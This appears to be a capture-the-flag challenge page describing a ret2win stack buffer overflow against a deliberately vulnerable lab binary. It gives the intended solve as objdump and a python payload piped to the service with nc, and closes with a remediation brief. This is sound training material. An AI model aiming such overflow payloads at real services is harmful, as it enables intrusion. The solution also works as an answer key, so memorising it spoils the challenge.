# i04 — Return to Sender (Pearl Telecom)

**Category:** Pwn / Stack buffer overflow (ret2win) · **Difficulty:** Intermediate · **Points:** 300 (dynamic)

## Intended solve
A network service reads input into a fixed stack buffer with no bounds check. The binary is
compiled **No-PIE, no stack canary**, and contains an unreferenced `win()` that prints the flag.
Overflow the saved return address to point at `win()`.

```sh
file ./return-to-sender     # ELF 64-bit, no PIE
# find the offset to the saved RIP (pattern / cyclic), and win()'s address:
objdump -d return-to-sender | grep -A2 '<win>:'      # e.g. 0x401216

python3 -c 'import sys; sys.stdout.buffer.write(b"A"*OFFSET + p64(0x401216))' | nc <host> <port>
# a stack-alignment ret gadget may be needed before win() on some libc paths:
#   payload = b"A"*OFFSET + p64(RET) + p64(WIN)
# -> CYPHER{...}
```

## Infra & safety
- Per-team instance (the vulnerable service under `nc`/socat), binary attached for offline
  analysis. Statically determinable offset; the flag is read by `win()` from a file in the
  container. No ASLR-dependent leak required (No-PIE) — kept deliberately below the cut heap
  challenge in difficulty.

## Remediation (Blue Team Brief)
Use bounded reads (`fgets`/length-checked `read`); compile with stack canaries, PIE, and RELRO;
never ship a debug/backdoor function in a production binary. Fuzz network parsers.
